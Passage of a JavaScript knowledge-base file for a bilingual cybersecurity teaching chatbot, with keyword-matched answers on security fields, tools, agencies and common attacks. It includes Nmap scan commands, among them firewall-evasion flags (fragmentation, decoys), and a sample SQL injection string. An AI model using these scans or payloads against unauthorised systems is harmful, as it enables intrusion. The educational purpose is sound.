// Knowledge Base for CyberBot
// -----------------------------------------------------------------------------
// INSTRUCCIONES PARA AÑADIR DATOS DE NOTEBOOKLM:
// 1. Copia el texto o la respuesta de NotebookLM.
// 2. Identifica las palabras clave (keywords) que un usuario podría usar para buscar eso.
// 3. Pega la información en el siguiente formato dentro del array `knowledgeBase`:
//
// Formato:
// {
//   keywords: ["palabra1", "palabra2", "frase clave"],
//   answer: "Tu respuesta aquí.", 
//   answerEn: "Your answer here."
// },
// -----------------------------------------------------------------------------

const knowledgeBase = [
    {
        keywords: ["objetivo", "target", "que es el objetivo", "ip objetivo", "victima", "what is target", "target ip"],
        answer: "En los ejemplos de Nmap, el **objetivo** (o target) se refiere a la **Dirección IP** o el nombre de dominio de la máquina que quieres auditar. <br>Por ejemplo, donde dice <code>objetivo</code>, deberías poner algo como <code>192.168.1.50</code> o <code>google.com</code>.",
        answerEn: "In Nmap examples, the **target** refers to the **IP Address** or domain name of the machine you want to audit. <br>For example, where it says <code>target</code>, you should put something like <code>192.168.1.50</code> or <code>google.com</code>."
    },
    {
        keywords: ["hola", "hello", "hi", "saludos", "greetings"],
        answer: "¡Hola! Soy CyberBot 🤖. Puedo ayudarte a encontrar herramientas en el árbol o responder preguntas sobre ciberseguridad. ¿En qué puedo ayudarte hoy?",
        answerEn: "Hello! I am CyberBot 🤖. I can help you find tools in the tree or answer cybersecurity questions. How can I help you today?"
    },
    // Definiciones Principales
    {
        keywords: ["que es la ciberseguridad", "ciberseguridad definicion", "seguridad informatica", "what is cybersecurity", "cybersecurity definition", "what is cibersecurity", "cibersecurity"],
        answer: "La **Ciberseguridad** es la práctica de proteger sistemas, redes y programas de ataques digitales. <br>🛡️ **Objetivo:** Proteger la confidencialidad, integridad y disponibilidad de la información. <br>🔎 Involucra personas, procesos y tecnología.",
        answerEn: "**Cybersecurity** is the practice of protecting systems, networks, and programs from digital attacks. <br>🛡️ **Goal:** Protect the confidentiality, integrity, and availability of information. <br>🔎 Involves people, processes, and technology."
    },
    {
        keywords: ["subredes", "subnet", "subred", "redes informaticas", "what is subnet", "subnets definition"],
        answer: "Una **Subred (Subnet)** es una segmentación lógica de una red más grande. <br>🌐 **¿Para qué sirve?** Mejora la eficiencia, reduce la congestión de tráfico y aumenta la seguridad al aislar segmentos de la red. <br>Ejemplo: Dividir una red de oficina en 'Ventas', 'RRHH' y 'Invitados'.",
        answerEn: "A **Subnet** is a logical segmentation of a larger network. <br>🌐 **What is it for?** Improves efficiency, reduces traffic congestion, and increases security by isolating network segments. <br>Example: Dividing an office network into 'Sales', 'HR', and 'Guests'."
    },
    // Categorías del Árbol - Enriquecidas con Herramientas
    {
        keywords: ["que es seguridad de redes", "network security", "seguridad red", "herramientas redes", "what is network security"],
        answer: "La **Seguridad de Redes** protege la infraestructura y los datos en tránsito. <br>🛡️ **Objetivo:** Evitar accesos no autorizados y ataques. <br>🛠️ **Herramientas Clave:** <br>- **Firewalls:** Palo Alto, FortiGate. <br>- **IDS/IPS:** Snort, Suricata. <br>- **Análisis:** Wireshark, Nmap.",
        answerEn: "**Network Security** protects infrastructure and data in transit. <br>🛡️ **Goal:** Prevent unauthorized access and attacks. <br>🛠️ **Key Tools:** <br>- **Firewalls:** Palo Alto, FortiGate. <br>- **IDS/IPS:** Snort, Suricata. <br>- **Analysis:** Wireshark, Nmap."
    },
    {
        keywords: ["que es seguridad ofensiva", "offensive security", "red team", "pentesting", "herramientas hacking", "what is offensive security"],
        answer: "La **Seguridad Ofensiva (Red Team)** simula ataques reales para encontrar vulnerabilidades. <br>⚔️ **Acciones:** Pentesting y simulación de adversarios. <br>️ **Arsenal:** <br>- **Escaneo:** Nmap, Nessus. <br>- **Explotación:** Metasploit, Burp Suite. <br>- **Phishing:** GoPhish.",
        answerEn: "**Offensive Security (Red Team)** simulates real attacks to find vulnerabilities. <br>⚔️ **Actions:** Pentesting and adversary simulation. <br>️ **Arsenal:** <br>- **Scanning:** Nmap, Nessus. <br>- **Exploitation:** Metasploit, Burp Suite. <br>- **Phishing:** GoPhish."
    },
    {
        keywords: ["que es seguridad defensiva", "defensive security", "blue team", "soc", "herramientas defensivas", "what is defensive security"],
        answer: "La **Seguridad Defensiva (Blue Team)** detecta y responde a ataques. <br>🛡️ **Roles:** SOC, Threat Hunting. <br>🛠️ **Stack Defensivo:** <br>- **SIEM:** Splunk, ELK. <br>- **EDR:** CrowdStrike, SentinelOne. <br>- **Forensics:** Autopsy.",
        answerEn: "**Defensive Security (Blue Team)** detects and responds to attacks. <br>🛡️ **Roles:** SOC, Threat Hunting. <br>🛠️ **Defensive Stack:** <br>- **SIEM:** Splunk, ELK. <br>- **EDR:** CrowdStrike, SentinelOne. <br>- **Forensics:** Autopsy."
    },
    {
        keywords: ["que es forense", "informatica forense", "digital forensics", "evidencia digital", "herramientas forense", "what is digital forensics"],
        answer: "La **Informática Forense** recupera y analiza evidencia digital. <br>🔍 **Uso:** Investigar cibercrímenes. <br>🛠️ **Herramientas Estándar:** <br>- **Discos:** Autopsy, EnCase, FTK Imager. <br>- **Memoria:** Volatility. <br>- **Móvil:** Cellebrite.",
        answerEn: "**Digital Forensics** recovers and analyzes digital evidence. <br>🔍 **Use:** Investigate cybercrimes. <br>🛠️ **Standard Tools:** <br>- **Disks:** Autopsy, EnCase, FTK Imager. <br>- **Memory:** Volatility. <br>- **Mobile:** Cellebrite."
    },
    {
        keywords: ["que es ciberinteligencia", "threat intelligence", "cti", "inteligencia de amenazas", "herramientas cti", "what is threat intelligence"],
        answer: "La **Ciberinteligencia (CTI)** analiza amenazas y actores maliciosos. <br>🧠 **Meta:** Anticiparse a los ataques. <br>🛠️ **Plataformas:** <br>- **Fuentes:** VirusTotal, AlienVault OTX. <br>- **Investigación:** Shodan, Maltego. <br>- **Frameworks:** MITRE ATT&CK.",
        answerEn: "**Cyber Intelligence (CTI)** analyzes threats and malicious actors. <br>🧠 **Goal:** Anticipate attacks. <br>🛠️ **Platforms:** <br>- **Sources:** VirusTotal, AlienVault OTX. <br>- **Investigation:** Shodan, Maltego. <br>- **Frameworks:** MITRE ATT&CK."
    },
    {
        keywords: ["que es seguridad cloud", "seguridad en la nube", "cloud security", "herramientas cloud", "what is cloud security"],
        answer: "La **Seguridad Cloud** protege entornos AWS, Azure y Google Cloud. <br>☁️ **Clave:** Responsabilidad Compartida. <br>🛠️ **Herramientas:** <br>- **CSPM:** Wiz, Orca Security. <br>- **IaC:** Terraform, Ansible. <br>- **Contenedores:** Kubernetes, Docker Bench.",
        answerEn: "**Cloud Security** protects AWS, Azure, and Google Cloud environments. <br>☁️ **Key:** Shared Responsibility. <br>🛠️ **Tools:** <br>- **CSPM:** Wiz, Orca Security. <br>- **IaC:** Terraform, Ansible. <br>- **Containers:** Kubernetes, Docker Bench."
    },
    {
        keywords: ["que es grc", "governance risk compliance", "gobierno riesgo cumplimiento", "herramientas grc", "what is grc"],
        answer: "El **GRC** alinea la seguridad con el negocio y las leyes. <br>📋 **Enfoque:** Normativas (GDPR, ISO 27001). <br>🛠️ **Software:** <br>- **Gestión:** RSA Archer, ServiceNow GRC. <br>- **Privacidad:** OneTrust.",
        answerEn: "**GRC** aligns security with business and laws. <br>📋 **Focus:** Regulations (GDPR, ISO 27001). <br>🛠️ **Software:** <br>- **Management:** RSA Archer, ServiceNow GRC. <br>- **Privacy:** OneTrust."
    },
    {
        keywords: ["que es iam", "identity access management", "gestion de identidades", "herramientas iam", "what is iam"],
        answer: "El **IAM** gestiona 'Quién puede entrar'. <br>🔑 **Elementos:** MFA, SSO. <br>🛠️ **Líderes:** <br>- **IdP:** Okta, Azure AD (Entra ID). <br>- **PAM:** CyberArk. <br>- **MFA:** Duo Security.",
        answerEn: "**IAM** manages 'Who can enter'. <br>🔑 **Elements:** MFA, SSO. <br>🛠️ **Leaders:** <br>- **IdP:** Okta, Azure AD (Entra ID). <br>- **PAM:** CyberArk. <br>- **MFA:** Duo Security."
    },
    {
        keywords: ["que es devsecops", "desarrollo seguro", "ci/cd security", "herramientas devsecops", "what is devsecops"],
        answer: "**DevSecOps** integra seguridad en el desarrollo (CI/CD). <br>🚀 **Meta:** Software seguro y rápido. <br>🛠️ **Pipeline:** <br>- **SAST:** SonarQube, Checkmarx. <br>- **SCA:** Snyk, Dependabot. <br>- **CI:** Jenkins, GitHub Actions.",
        answerEn: "**DevSecOps** integrates security into development (CI/CD). <br>🚀 **Goal:** Secure and fast software. <br>🛠️ **Pipeline:** <br>- **SAST:** SonarQube, Checkmarx. <br>- **SCA:** Snyk, Dependabot. <br>- **CI:** Jenkins, GitHub Actions."
    },
    {
        keywords: ["que es appsec", "seguridad de aplicaciones", "application security", "herramientas appsec", "what is appsec"],
        answer: "**AppSec** asegura el software (Web, Móvil, API). <br>📲 **Meta:** Evitar vulnerabilidades. <br>🛠️ **Herramientas:** <br>- **DAST:** OWASP ZAP, Burp Suite. <br>- **Móvil:** MobSF. <br>- **WAF:** Cloudflare.",
        answerEn: "**AppSec** secures software (Web, Mobile, API). <br>📲 **Goal:** Prevent vulnerabilities. <br>🛠️ **Tools:** <br>- **DAST:** OWASP ZAP, Burp Suite. <br>- **Mobile:** MobSF. <br>- **WAF:** Cloudflare."
    },
    {
        keywords: ["como instalar herramientas", "como descargar", "instalacion", "donde descargar", "how to install", "how to download", "where to download"],
        answer: "📦 **Instalación General:** <br>La mayoría de estas herramientas (Nmap, Metasploit, Wireshark...) vienen pre-instaladas en **Kali Linux** o **Parrot Security**. <br><br>💻 **Para Windows/Mac:** <br>Busca la herramienta específica aquí en el chat (ej: 'Nmap') y usa el enlace **'Sitio Oficial'** que te proporcionaré para descargarla de forma segura.",
        answerEn: "📦 **General Installation:** <br>Most of these tools (Nmap, Metasploit, Wireshark...) come pre-installed on **Kali Linux** or **Parrot Security**. <br><br>💻 **For Windows/Mac:** <br>Search for the specific tool here in the chat (e.g., 'Nmap') and use the **'Official Site'** link I will provide to download it securely."
    },
    {
        keywords: ["como te llamas", "quien eres", "tienes nombre", "tu nombre", "name", "nombre", "llamas", "whats your name", "who are you"],
        answer: "Soy **CiberBot** 🤖, tu asistente virtual experto en ciberseguridad.",
        answerEn: "I am **CiberBot** 🤖, your virtual assistant expert in cybersecurity."
    },
    {
        keywords: ["ayuda", "help", "que puedes hacer", "capacidad", "what can you do"],
        answer: "Puedo buscar herramientas por nombre (ej: 'Nmap'), explicar categorías (ej: 'Ofensiva') o responder preguntas generales si están en mi base de datos.",
        answerEn: "I can search tools by name (e.g., 'Nmap'), explain categories (e.g., 'Offensive'), or answer general questions if they are in my database."
    },
    {
        keywords: ["nmap", "network mapper"],
        answer: "**Nmap** es una herramienta de escaneo de redes y auditoría de seguridad. Se utiliza para descubrir hosts y servicios en una red informática.",
        answerEn: "**Nmap** is a network scanning and security auditing tool. It is used to discover hosts and services on a computer network."
    },
    {
        keywords: ["metasploit"],
        answer: "**Metasploit Framework** es una herramienta para desarrollar y ejecutar exploits contra una máquina remota.",
        answerEn: "**Metasploit Framework** is a tool for developing and executing exploits against a remote machine."
    },
    {
        keywords: ["wireshark"],
        answer: "**Wireshark** es un analizador de protocolos de red. Te permite ver lo que está sucediendo en tu red a un nivel microscópico.",
        answerEn: "**Wireshark** is a network protocol analyzer. It allows you to see what is happening on your network at a microscopic level."
    },
    {
        keywords: ["nmap", "basico", "basicos", "escanear", "red", "descubrimiento", "ping", "scan", "comandos", "comando"],
        answer: "Para descubrir hosts (Ping Scan): <code>nmap -sP 10.0.0.0/24</code>. <br>Escaneo rápido: <code>nmap -F 192.168.1.1</code>.<br><br>💡 <b>¿Quieres más?</b> Pregunta por: <br>- 'Escanear todos los puertos'<br>- 'Detectar sistema operativo'<br>- 'Scripts NSE'<br>- 'Evasión de Firewall'",
        answerEn: "To discover hosts (Ping Scan): <code>nmap -sP 10.0.0.0/24</code>. <br>Fast scan: <code>nmap -F 192.168.1.1</code>.<br><br>💡 <b>Want more?</b> Ask for: <br>- 'Scan all ports'<br>- 'Detect operating system'<br>- 'NSE Scripts'<br>- 'Firewall Evasion'"
    },
    {
        keywords: ["escanear", "todos", "los", "puertos", "rango", "full", "scan", "completo"],
        answer: "Para escanear **todos** los puertos (1-65535) con detección de versión: <br><code>nmap -p 1-65535 -sV -sS -T4 objetivo</code>.",
        answerEn: "To scan **all** ports (1-65535) with version detection: <br><code>nmap -p 1-65535 -sV -sS -T4 target</code>."
    },
    {
        keywords: ["detectar", "so", "sistema", "operativo", "version", "servicios", "os", "detection"],
        answer: "Usa la bandera <b>-O</b> para el Sistema Operativo y <b>-sV</b> para versiones. <br>Comando completo: <code>nmap -A -T4 objetivo</code> (incluye OS, versión, scripts y traceroute).",
        answerEn: "Use the <b>-O</b> flag for Operating System and <b>-sV</b> for versions. <br>Complete command: <code>nmap -A -T4 target</code> (includes OS, version, scripts, and traceroute)."
    },
    {
        keywords: ["scripts", "script", "nse", "vulnerabilidades", "vuln", "auditoria"],
        answer: "El motor **NSE** de Nmap es muy potente. <br>- Buscar vulnerabilidades: <code>nmap --script vuln objetivo</code><br>- Analizar cabeceras HTTP: <code>nmap --script http-headers objetivo</code>",
        answerEn: "The **NSE** engine of Nmap is very powerful. <br>- Scan for vulnerabilities: <code>nmap --script vuln target</code><br>- Analyze HTTP headers: <code>nmap --script http-headers target</code>"
    },
    {
        keywords: ["evasion", "evadir", "firewall", "ids", "ocultar", "spoofing"],
        answer: "Para evadir defensas: <br>- Fragmentar paquetes: <code>nmap -f objetivo</code><br>- Usar señuelos (decoys): <code>nmap -D RND:10 objetivo</code>",
        answerEn: "To evade defenses: <br>- Fragment packets: <code>nmap -f target</code><br>- Use decoys: <code>nmap -D RND:10 target</code>"
    },
    {
        keywords: ["guardar resultados", "salida nmap", "reporte nmap"],
        answer: "Formatos de salida útiles: <br><b>-oN archivo.txt</b> (Normal)<br><b>-oX archivo.xml</b> (XML)<br><b>-oG archivo.grep</b> (Grepable)<br><b>-oA base</b> (Todos los formatos a la vez).",
        answerEn: "Useful output formats: <br><b>-oN file.txt</b> (Normal)<br><b>-oX file.xml</b> (XML)<br><b>-oG file.grep</b> (Grepable)<br><b>-oA base</b> (All formats at once)."
    },
    {
        keywords: ["metasploit", "explotacion", "framework"],
        answer: "**Metasploit Framework** es una herramienta esencial para pruebas de penetración. Permite desarrollar y ejecutar exploits contra vulnerabilidades enumeradas previamente.",
        answerEn: "**Metasploit Framework** is an essential tool for penetration testing. It allows developing and executing exploits against previously enumerated vulnerabilities."
    },
    {
        keywords: ["linux exploiting", "shellcodes", "buffer overflow"],
        answer: "La explotación en Linux implica técnicas como **Stack Overflows**, uso de **Shellcodes** y manipulación de memoria. Herramientas como GDB son vitales para depurar y crear exploits.",
        answerEn: "Linux exploitation involves techniques like **Stack Overflows**, use of **Shellcodes**, and memory manipulation. Tools like GDB are vital for debugging and creating exploits."
    },
    {
        keywords: ["apt", "amenaza persistente", "zero-day"],
        answer: "Una **APT (Amenaza Persistente Avanzada)** es un ataque prolongado y dirigido. Una vulnerabilidad **Zero-day** es aquella que es desconocida para el fabricante y para la cual no existe parche todavía.",
        answerEn: "An **APT (Advanced Persistent Threat)** is a prolonged and targeted attack. A **Zero-day** vulnerability is one that is unknown to the vendor and for which no patch exists yet."
    },
    {
        keywords: ["ip privadas", "rangos ip", "clases ip"],
        answer: "Las IPs privadas no son enrutables en internet. <br>Clase A: 10.0.0.0/8 <br>Clase B: 172.16.0.0/12 <br>Clase C: 192.168.0.0/16",
        answerEn: "Private IPs are not routable on the internet. <br>Class A: 10.0.0.0/8 <br>Class B: 172.16.0.0/12 <br>Class C: 192.168.0.0/16"
    },
    // Añadido desde ciberseguridad.txt
    {
        keywords: ["incibe", "españa", "instituto", "nacional"],
        answer: "El **INCIBE** (Instituto Nacional de Ciberseguridad) es el organismo de referencia en España. Ofrece servicios para ciudadanos (OSI) y empresas. <br>Web: <a href='https://www.incibe.es/' target='_blank'>incibe.es</a>",
        answerEn: "**INCIBE** (National Institute of Cybersecurity) is the reference body in Spain. It offers services for citizens (OSI) and companies. <br>Web: <a href='https://www.incibe.es/' target='_blank'>incibe.es</a>"
    },
    {
        keywords: ["ccn", "ccn-cert", "centro", "criptologico"],
        answer: "El **CCN-CERT** gestiona incidentes de seguridad en la administración pública española. Es la referencia para el sector público. <br>Web: <a href='https://www.ccn-cert.cni.es' target='_blank'>ccn-cert.cni.es</a>",
        answerEn: "**CCN-CERT** manages security incidents in the Spanish public administration. It is the reference for the public sector. <br>Web: <a href='https://www.ccn-cert.cni.es' target='_blank'>ccn-cert.cni.es</a>"
    },
    {
        keywords: ["cisa", "usa", "agencia", "americana"],
        answer: "**CISA** es la Agencia de Seguridad de Infraestructura y Ciberseguridad de EE.UU. Lidera el esfuerzo nacional para asegurar la infraestructura crítica. <br>Web: <a href='https://www.cisa.gov/' target='_blank'>cisa.gov</a>",
        answerEn: "**CISA** is the Cybersecurity and Infrastructure Security Agency of the USA. It leads the national effort to secure critical infrastructure. <br>Web: <a href='https://www.cisa.gov/' target='_blank'>cisa.gov</a>"
    },
    {
        keywords: ["enisa", "europa", "union", "europea"],
        answer: "**ENISA** es la Agencia de la Unión Europea para la Ciberseguridad. Trabaja para elevar el nivel de seguridad en toda la UE. <br>Web: <a href='https://www.enisa.europa.eu/' target='_blank'>enisa.europa.eu</a>",
        answerEn: "**ENISA** is the European Union Agency for Cybersecurity. It works to raise the level of security throughout the EU. <br>Web: <a href='https://www.enisa.europa.eu/' target='_blank'>enisa.europa.eu</a>"
    },
    {
        keywords: ["nist", "estandares", "framework", "normas"],
        answer: "El **NIST** (National Institute of Standards and Technology) publica estándares clave como el *Cybersecurity Framework*, muy usado mundialmente. <br>Web: <a href='https://csrc.nist.gov/' target='_blank'>csrc.nist.gov</a>",
        answerEn: "**NIST** (National Institute of Standards and Technology) publishes key standards like the *Cybersecurity Framework*, widely used worldwide. <br>Web: <a href='https://csrc.nist.gov/' target='_blank'>csrc.nist.gov</a>"
    },
    // Añadido desde Webs Oficiales
    {
        keywords: ["wireshark oficial", "que es wireshark", "wireshark features"],
        answer: "Según su web oficial, **Wireshark** es el analizador de protocolos de red líder mundial. <br>🔎 **Características:** Inspección profunda de cientos de protocolos, captura en vivo y análisis offline. <br>Es Open Source y multiplataforma. <br>🔗 <a href='https://www.wireshark.org/' target='_blank'>Web Oficial</a>",
        answerEn: "According to its official website, **Wireshark** is the world's leading network protocol analyzer. <br>🔎 **Features:** Deep inspection of hundreds of protocols, live capture, and offline analysis. <br>It is Open Source and cross-platform. <br>🔗 <a href='https://www.wireshark.org/' target='_blank'>Official Website</a>"
    },
    {
        keywords: ["burp suite oficial", "que es burp", "portswigger"],
        answer: "Según PortSwigger, **Burp Suite** es una suite completa para pruebas de seguridad web. <br>🚀 **Versiones:** Community (Free), Professional (Manual Testing) y Enterprise (Automated Scanning). <br>🔗 <a href='https://portswigger.net/burp' target='_blank'>Web Oficial</a>",
        answerEn: "According to PortSwigger, **Burp Suite** is a complete suite for web security testing. <br>🚀 **Versions:** Community (Free), Professional (Manual Testing), and Enterprise (Automated Scanning). <br>🔗 <a href='https://portswigger.net/burp' target='_blank'>Official Website</a>"
    },
    {
        keywords: ["metasploit oficial", "rapid7", "framework metasploit"],
        answer: "Según Rapid7, **Metasploit** es el framework de pruebas de penetración más usado del mundo. <br>⚔️ **Poder:** Permite verificar vulnerabilidades, gestionar evaluaciones de seguridad y mejorar la concienciación. <br>🔗 <a href='https://www.metasploit.com/' target='_blank'>Web Oficial</a>",
        answerEn: "According to Rapid7, **Metasploit** is the world's most used penetration testing framework. <br>⚔️ **Power:** Allows verifying vulnerabilities, managing security assessments, and improving awareness. <br>🔗 <a href='https://www.metasploit.com/' target='_blank'>Official Website</a>"
    },
    {
        keywords: ["nmap oficial", "que es nmap", "descubrimiento red"],
        answer: "Según Nmap.org, **Nmap** es una utilidad gratuita y Open Source para descubrimiento de redes y auditoría. <br>🌍 **Uso:** Inventario de red, gestión de actualizaciones y monitoreo de uptime. <br>🔗 <a href='https://nmap.org/' target='_blank'>Web Oficial</a>",
        answerEn: "According to Nmap.org, **Nmap** is a free and Open Source utility for network discovery and auditing. <br>🌍 **Usage:** Network inventory, upgrade management, and uptime monitoring. <br>🔗 <a href='https://nmap.org/' target='_blank'>Official Website</a>"
    },
    {
        keywords: ["zap oficial", "owasp zap", "ced attack proxy"],
        answer: "Según su web, **OWASP ZAP** es el escáner de aplicaciones web más usado del mundo. <br>🆓 **Plus:** Es totalmente gratuito, open source y mantenido por una comunidad global. Ideal para iniciarse o automatizar en CI/CD. <br>🔗 <a href='https://www.zaproxy.org/' target='_blank'>Web Oficial</a>",
        answerEn: "According to its website, **OWASP ZAP** is the world's most used web application scanner. <br>🆓 **Plus:** It is completely free, open source, and maintained by a global community. Ideal for starting or automating in CI/CD. <br>🔗 <a href='https://www.zaproxy.org/' target='_blank'>Official Website</a>"
    },
    {
        keywords: ["ghidra oficial", "nsa tool", "ingenieria inversa oficial"],
        answer: "Según la web oficial, **Ghidra** es un framework de ingeniería inversa de software (SRE) creado por la **NSA**. <br>🕵️‍♂️ **Capacidades:** Desensamblado, decompilación y análisis de binarios en Windows, macOS y Linux. <br>🔗 <a href='https://ghidra-sre.org/' target='_blank'>Web Oficial</a>",
        answerEn: "According to the official website, **Ghidra** is a software reverse engineering (SRE) framework created by the **NSA**. <br>🕵️‍♂️ **Capabilities:** Disassembly, decompilation, and binary analysis on Windows, macOS, and Linux. <br>🔗 <a href='https://ghidra-sre.org/' target='_blank'>Official Website</a>"
    },
    {
        keywords: ["splunk oficial", "que es splunk", "siem oficial"],
        answer: "Según Splunk.com, **Splunk** es la clave para la resiliencia empresarial. <br>📊 **Poder:** Plataforma unificada de seguridad y observabilidad que permite prevenir problemas mayores y absorber choques digitales. <br>🔗 <a href='https://www.splunk.com/' target='_blank'>Web Oficial</a>",
        answerEn: "According to Splunk.com, **Splunk** is the key to enterprise resilience. <br>📊 **Power:** Unified security and observability platform that helps prevent major issues and absorb digital shocks. <br>🔗 <a href='https://www.splunk.com/' target='_blank'>Official Website</a>"
    },
    // === FUNDAMENTAL CONCEPTS ===
    {
        keywords: ["cia triad", "triada cia", "confidencialidad integridad disponibilidad", "confidentiality integrity availability"],
        answer: "La **Tríada CIA** son los tres pilares de la ciberseguridad:<br>🔒 **Confidencialidad:** Solo usuarios autorizados acceden a la información.<br>✅ **Integridad:** Los datos no son alterados sin autorización.<br>🌐 **Disponibilidad:** La información está accesible cuando se necesita.",
        answerEn: "The **CIA Triad** are the three pillars of cybersecurity:<br>🔒 **Confidentiality:** Only authorized users access information.<br>✅ **Integrity:** Data is not altered without authorization.<br>🌐 **Availability:** Information is accessible when needed."
    },
    {
        keywords: ["diferencia amenaza vulnerabilidad riesgo", "threat vulnerability risk difference", "amenaza vs vulnerabilidad"],
        answer: "**Amenaza:** Peligro potencial que puede explotar una vulnerabilidad.<br>**Vulnerabilidad:** Debilidad en un sistema que puede ser explotada.<br>**Riesgo:** Probabilidad de que una amenaza explote una vulnerabilidad y cause daño.",
        answerEn: "**Threat:** Potential danger that can exploit a vulnerability.<br>**Vulnerability:** Weakness in a system that can be exploited.<br>**Risk:** Probability that a threat exploits a vulnerability and causes damage."
    },
    {
        keywords: ["que es un exploit", "what is exploit", "exploit definition"],
        answer: "Un **exploit** es un código o técnica que aprovecha una vulnerabilidad específica para comprometer un sistema. Puede ser local (requiere acceso físico) o remoto (a través de la red).",
        answerEn: "An **exploit** is code or technique that takes advantage of a specific vulnerability to compromise a system. It can be local (requires physical access) or remote (over the network)."
    },
    {
        keywords: ["que es un payload", "what is payload", "carga útil"],
        answer: "El **payload** es la 'carga útil' de un exploit: el código malicioso que se ejecuta después de explotar la vulnerabilidad. Ejemplos: reverse shell, keylogger, ransomware.",
        answerEn: "The **payload** is the 'useful load' of an exploit: the malicious code that executes after exploiting the vulnerability. Examples: reverse shell, keylogger, ransomware."
    },
    {
        keywords: ["que es un cve", "what is cve", "common vulnerabilities exposures"],
        answer: "**CVE** (Common Vulnerabilities and Exposures) es un sistema de identificación único para vulnerabilidades conocidas. Ejemplo: CVE-2021-44228 (Log4Shell).<br>🔗 <a href='https://cve.mitre.org/' target='_blank'>cve.mitre.org</a>",
        answerEn: "**CVE** (Common Vulnerabilities and Exposures) is a unique identification system for known vulnerabilities. Example: CVE-2021-44228 (Log4Shell).<br>🔗 <a href='https://cve.mitre.org/' target='_blank'>cve.mitre.org</a>"
    },
    // === COMMON ATTACKS ===
    {
        keywords: ["que es phishing", "what is phishing", "phishing attack", "ataque phishing"],
        answer: "**Phishing** es un ataque de ingeniería social donde el atacante se hace pasar por una entidad confiable (banco, empresa) para robar credenciales o información sensible, generalmente vía email.<br>🎣 **Prevención:** Verificar remitentes, no hacer clic en enlaces sospechosos, usar MFA.",
        answerEn: "**Phishing** is a social engineering attack where the attacker impersonates a trusted entity (bank, company) to steal credentials or sensitive information, usually via email.<br>🎣 **Prevention:** Verify senders, don't click suspicious links, use MFA."
    },
    {
        keywords: ["que es ransomware", "what is ransomware", "secuestro datos", "crypto locker"],
        answer: "**Ransomware** es malware que cifra tus archivos y exige un rescate (generalmente en Bitcoin) para devolverte el acceso.<br>💰 **Ejemplos famosos:** WannaCry, Ryuk, LockBit.<br>🛡️ **Prevención:** Backups regulares, no abrir adjuntos sospechosos, mantener sistemas actualizados.",
        answerEn: "**Ransomware** is malware that encrypts your files and demands a ransom (usually in Bitcoin) to restore access.<br>💰 **Famous examples:** WannaCry, Ryuk, LockBit.<br>🛡️ **Prevention:** Regular backups, don't open suspicious attachments, keep systems updated."
    },
    {
        keywords: ["diferencia virus gusano troyano", "virus worm trojan difference", "malware types"],
        answer: "**Virus:** Se adjunta a archivos legítimos y necesita que el usuario lo ejecute.<br>**Gusano:** Se auto-replica y propaga por la red sin intervención humana.<br>**Troyano:** Se disfraza de software legítimo pero ejecuta acciones maliciosas (no se replica).",
        answerEn: "**Virus:** Attaches to legitimate files and needs user execution.<br>**Worm:** Self-replicates and spreads across networks without human intervention.<br>**Trojan:** Disguises as legitimate software but performs malicious actions (doesn't replicate)."
    },
    {
        keywords: ["que es ddos", "what is ddos", "ataque denegacion servicio", "denial of service"],
        answer: "Un ataque **DDoS** (Distributed Denial of Service) inunda un servidor con tráfico desde múltiples fuentes (botnet), sobrecargándolo hasta hacerlo inaccesible.<br>🌊 **Diferencia con DoS:** DDoS usa múltiples máquinas; DoS usa una sola.",
        answerEn: "A **DDoS** (Distributed Denial of Service) attack floods a server with traffic from multiple sources (botnet), overwhelming it until it becomes inaccessible.<br>🌊 **Difference from DoS:** DDoS uses multiple machines; DoS uses a single one."
    },
    {
        keywords: ["que es sql injection", "what is sql injection", "sqli", "inyeccion sql"],
        answer: "**SQL Injection** es un ataque donde se insertan comandos SQL maliciosos en campos de entrada para manipular la base de datos.<br>💉 **Ejemplo:** <code>' OR '1'='1</code><br>🛡️ **Prevención:** Usar consultas preparadas (prepared statements), validar entradas.",
        answerEn: "**SQL Injection** is an attack where malicious SQL commands are inserted into input fields to manipulate the database.<br>💉 **Example:** <code>' OR '1'='1</code><br>🛡️ **Prevention:** Use prepared statements, validate inputs."
    },
    {
        keywords: ["que es xss", "what is xss", "cross site scripting", "scripting entre sitios"],
        answer: "**XSS** (Cross-Site Scripting) inyecta scripts maliciosos en páginas web confiables. Cuando otros usuarios visitan la página, el script se ejecuta en su navegador, robando cookies o sesiones.<br>🛡️ **Prevención:** Sanitizar entradas, usar Content Security Policy (CSP).",
        answerEn: "**XSS** (Cross-Site Scripting) injects malicious scripts into trusted web pages. When other users visit the page, the script executes in their browser, stealing cookies or sessions.<br>🛡️ **Prevention:** Sanitize inputs, use Content Security Policy (CSP)."
    },
    {
        keywords: ["que es man in the middle", "mitm attack", "ataque intermediario", "what is mitm"],
        answer: "Un ataque **MITM** (Man-in-the-Middle) ocurre cuando un atacante intercepta la comunicación entre dos partes sin que lo sepan, pudiendo espiar o modificar los datos.<br>📡 **Ejemplo:** Interceptar tráfico en WiFi pública.<br>🛡️ **Prevención:** Usar HTTPS, VPN, verificar certificados SSL.",
        answerEn: "A **MITM** (Man-in-the-Middle) attack occurs when an attacker intercepts communication between two parties without their knowledge, being able to spy or modify data.<br>📡 **Example:** Intercepting traffic on public WiFi.<br>🛡️ **Prevention:** Use HTTPS, VPN, verify SSL certificates."
    },
    {
        keywords: ["que es brute force", "ataque fuerza bruta", "what is brute force", "password cracking"],
        answer: "Un ataque de **fuerza bruta** prueba sistemáticamente todas las combinaciones posibles de contraseñas hasta encontrar la correcta.<br>🔨 **Variante:** Dictionary attack (usa lista de contraseñas comunes).<br>🛡️ **Prevención:** Contraseñas largas y complejas, MFA, límite de intentos fallidos.",
        answerEn: "A **brute force** attack systematically tries all possible password combinations until finding the correct one.<br>🔨 **Variant:** Dictionary attack (uses list of common passwords).<br>🛡️ **Prevention:** Long complex passwords, MFA, failed attempt limits."
    },
    {
        keywords: ["que es spear phishing", "what is spear phishing", "phishing dirigido"],
        answer: "**Spear Phishing** es phishing altamente personalizado dirigido a individuos específicos (generalmente ejecutivos). El atacante investiga a la víctima para hacer el engaño más creíble.<br>🎯 **Más peligroso que:** Phishing masivo genérico.",
        answerEn: "**Spear Phishing** is highly personalized phishing targeting specific individuals (usually executives). The attacker researches the victim to make the deception more believable.<br>🎯 **More dangerous than:** Generic mass phishing."
    },
    {
        keywords: ["que es dns spoofing", "dns poisoning", "envenenamiento dns", "what is dns spoofing"],
        answer: "**DNS Spoofing** (o DNS Poisoning) corrompe la caché DNS para redirigir usuarios de sitios legítimos a sitios maliciosos sin que lo noten.<br>🌐 **Resultado:** Visitas 'google.com' pero llegas a un sitio falso.<br>🛡️ **Prevención:** DNSSEC, usar servidores DNS confiables.",
